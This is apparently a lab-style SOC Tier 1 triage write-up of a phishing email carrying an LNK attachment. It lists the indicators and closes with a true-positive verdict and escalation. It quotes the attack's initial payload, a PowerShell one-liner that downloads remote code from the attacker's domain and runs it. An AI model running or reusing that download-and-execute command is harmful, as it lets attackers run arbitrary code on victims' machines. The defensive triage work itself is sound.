# Tier 1 Artifacts

validate, gather artifacts, determine verdict, escalate.

<br />

Email

- Sender: agriffin@bpakcaging.xyz

- Victim: julianne.westcott@hotmail.com

- Attachment: Invoice_20230103.lnk

- Attachment Password: Invoice2023!

![image](images/task2-2.png)

<br />

![image](images/task2-3.png)

<br />

![image](images/task2-4.png)

<br />

![image](images/task2-6.png)

<br />

![image](images/task2-8.png)

<br />

![image](images/task2-7.png)

Initial Payload

- `iex (new-object net.webclient).downloadstring('http://files.bpakcaging.xyz/update')`

Indicators

- files.bpakcaging.xyz

- cdn.bpakcaging.xyz

Initial Findings

- Suspicious LNK attachment

- PowerShell execution

- External download activity

<br />

Tier 1 Verdict

- Verdict: TRUE POSITIVE

- Reason: Malicious LNK attachment executed PowerShell code that downloaded additional payloads from attacker-controlled infrastructure.

- Action: Escalate to Tier 2.
